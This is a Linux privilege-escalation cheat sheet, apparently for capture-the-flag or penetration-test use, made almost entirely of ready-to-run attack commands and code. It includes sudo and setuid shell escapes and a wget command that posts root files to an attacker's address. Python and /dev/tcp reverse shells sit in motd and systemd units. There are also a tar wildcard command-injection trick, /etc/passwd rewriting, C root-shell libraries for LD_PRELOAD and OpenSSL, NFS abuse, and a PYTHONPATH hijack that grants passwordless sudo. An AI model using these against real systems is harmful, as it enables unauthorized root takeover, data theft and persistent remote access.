# Privilege escalation cheatsheets

## Summary
* [Automation for privilege escalation](#automate-enumeration-for-privilege-escalation)
* [Exploiting Sudo](#sudo)
* [Exploiting kernel version](#kernel)
* [Exploiting nmap](#nmap)
* [Exploiting SetUID](#setuid)
	* [Base64 Setuid](#base64-setuid)
	* [Doas Setuid](#doas-setuid)
* [Exploiting capabilities](#capabilities)
	* [List capabilities](#list-capabilities)
	* [Vim capabilities](#vim-capabilites-for-cap_setuid)
	* [Ruby capabilities](#ruby-capabilities-for-cap_chown)
* [Exploiting cron jobs](#exploiting-cron-jobs)
* [Exploiting NFS](#exploiting-nfs)
* [Exploiting tar wildcard](#tar-wildcard)
* [Rewrite /etc/passwd](#rewrite-/etc/passwd)
* [SSH welcome interface](#/etc/update-motd.d-for-ssh-welcome-interface)
* [Modify PATH variable](#modify-path-variable)
* [Soft links files](#soft-link-files-for-privilege-escalation)
* [Exploiting LD_PRELOAD](#env_keepld_preload)
* [OpenSSL library loads](#openssl-capabilities-library-load)
* [Exploit Sudo services](#exploit-sudo-program)
* [Exploit NO_ROOT_SQUASH on NFS](#exploit-no_root_squash-on-nfs)
* [Exploit NFS with UID & GID](#exploit-nfs-with-uid--gid)
* [PYTHONPATH hijacking](#pythonpath-hijacking)

## Automate enumeration for privilege escalation
```
LinPeas
LinEnum
Les
LinuxSmartEnumeration
LinuxPrivChecker
```

## Sudo
```
sudo [filename] stdin exec:/bin/bash
sudo find /etc/passwd -exec /bin/sh \;
sudo vim -c '!sh'
sudo awk 'BEGIN {system("/bin/sh")}'
echo "os.execute('/bin/sh')" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse
sudo nano /etc/sudoers
sudo /usr/bin/wget --post-file=/root/root_flag.txt http://[ip]:[port]    {set up a listener in local host}
```

## Kernel
```
uname -a -- to get the kernel version
```

## Nmap
```
sudo nmap --interactive
```

## SetUID
### Base64 SetUID
```
LFILE=[file to read]
/usr/bin/base64 "$LFILE" | base64 --decoded
```
### Doas SetUID
```
/usr/bin/doas -u root /bin/bash 
/etc/doas.conf --> doas config file
```

## Capabilities
### List capabilities
```
getcap -r / 2>/dev/null
```
### VIM capabilites for cap_setuid
```
./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```
### Ruby capabilites for cap_chown
```
/usr/local/bin/ruby -e 'require "fileutils"; FileUtils.chown(1002, 1002, "/etc/shadow")'
```

## Cron jobs
```
cat /etc/crontab
```

## Network File System
```
cat /etc/exports
showmount -e [ip]  {remote host}
mkdir /tmp/[file]  {local host}
mount -o rw [ip]:[file] [directory path] -nolock // mount -t nfs [ip]: [local mount file]
nano exec.c  
        ''' 
        int main()
        {   
            setgid(0);
            setuid(0);
            system("/bin/bash");
            return 0;
        }
        '''
gcc exec.c -o [save file] -w
chmod +s [save file]
execute on remote host and get root shell
```

### Tar wildcard 
```
tar [file name] *   {example for tar wildcard in cronjobs}
first change directory to the respective directory
printf '#!/bin/bash\nchmod +s /bin/bash' > shell.sh {setuid binary for /bin/bash}
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
/bin/bash -p
```

## Set new password for root in /etc/passwd
```
root:[new pass]:0:0:root:/root:/bin/bash
cp /etc/passwd /dev/shm
cp /etc/passwd into new file in local host
create new password with python crypt
     import crypt
     crypt.crypt("[password]")
paste created password into [new pass] in copied /etc/passwd file
send edited /etc/passwd to remote host
su root with the password created
```

## /etc/update-motd.d for SSH welcome interface
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[ip]",[port]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
set up a listener and log in back into ssh
```

## Modify PATH variable
```
echo "/bin/bash" > [file]
chmod +x [file]
export PATH=/tmp:$PATH
```

## Soft link files for privilege escalation
```
cd /var/www/scripts/
echo "cp /bin/bash /home/plot_admin/pa_shell; chmod +xs /home/plot_admin/pa_shell" > script.sh
chmod +x script.sh
ln -sf script.sh backup.sh
/home/plot_admin/pa_shell -p
```

## ENV_KEEP+=LD_PRELOAD
#### Allow programs to use shared libraries
```
run sudo -l and find env_keep+=LD_PRELOAD
> EXAMPLE = secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\,env_keep+=LD_PRELOAD
write a c code compiled as share object
nano shell.c
  #include <stdio.h>
        #include <sys/types.h>
        #include <stdlib.h>

        void _init() {
            unsetenv("LD_PRELOAD");
            setgid(0);
            setuid(0);
            system("/bin/bash");
        }
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
run sudo LD_PRELOAD=[path to shell.so] [program to run]
```

## OpenSSL capabilities library load
#### It loads shared libraries that may be used to run code in the binary execution context 
```
#include <stdio.h>
      #include <sys/types.h>
      #include <unistd.h>
      #include <openssl/engine.h>

      static const char *engine_id = "root shell";
      static const char *engine_name = "Spawns a root shell";

      static int bind(ENGINE *e, const char *id)
      {
         int ret = 0;

         if (!ENGINE_set_id(e, engine_id)) {
             fprintf(stderr, "ENGINE_set_id failed\n");
             goto end;
         }
        
         if (!ENGINE_set_name(e, engine_name)) {
             printf("ENGINE_set_name failed\n");
             goto end;
         }

         setuid(0);
         setgid(0);
         system("/bin/bash");
        
         ret = 1;
        
         end:
         return ret;
     }

     IMPLEMENT_DYNAMIC_BIND_FN(bind)
     IMPLEMENT_DYNAMIC_CHECK_FN()
$ gcc -fPIC -o rootshell.o -c rootshell.c
      $ gcc -shared -o rootshell.so -lcrypto rootshell.o
chmod +x rootshell.so
openssl req -engine ./rootshell.so
```

## Exploit Sudo program
```
(ALL:ALL) /usr/sbin/service vsftpd restart
check if the /etc/systemd/system/multi-user.target.wants/vsftpd.service file if it is world-writable
edit the file to spawn a reverse shell as root
        {
            [Unit]
            Description=vsftpd FTP server
            After=network.target
            [Service]
            Type=simple
            User=root
            ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1'
            [Install]
            WantedBy=multi-user.target
        }
run 'systemctl daemon-reload' before executing the altered script
then run 'sudo /usr/sbin/service vsftpd restart' with your listener on local machine on standby
```

## Exploit NO_ROOT_SQUASH on NFS
```
cat /etc/exports
> /home/james *(rw, fsid=0,sync,no_root_squash,insecure)
no_root_squash allows remote users to change any file on the shared file system
mount -t nfs ip: /tmp/mount
in the mounted directories, you can change or upload any programs you want that could result in privilege escalation
```

## Exploit NFS with user's UID & GID
```
cat /etc/exports
> /home/james *(rw,sync,root_squash)
add user on local machine with 3003 as the uid & gid
> useradd -u 3003 james
create a directory for mounting
mount the nfs files
> mount -t nfs 10.1.10.1:/home/james /mount
change james shell to /bin/bash
> usermod --shell /bin/bash james
change user to james and access the mount point
```

## PYTHONPATH hijacking
```
> (ALL) SETENV: /usr/bin/python3 /opt/backup.py
we can set an environment variable (SETENV) and /opt/backup.py imports a library called zipfile and create a python file named zipfile.py on local machine then sends it to the target machine
> class ZipFile:
    def close(*args):
        return

    def write(*args):
        return

    def __init__(self, *args):
        return

    with open('/etc/sudoers', 'a+') as f:
        f.write("user ALL=(ALL) NOPASSWD: ALL\n")
> the script will edit the /etc/sudoers file to include the current user in it
sudo PYTHONPATH=/home/current /usr/bin/python3 /opt/backup.py
```
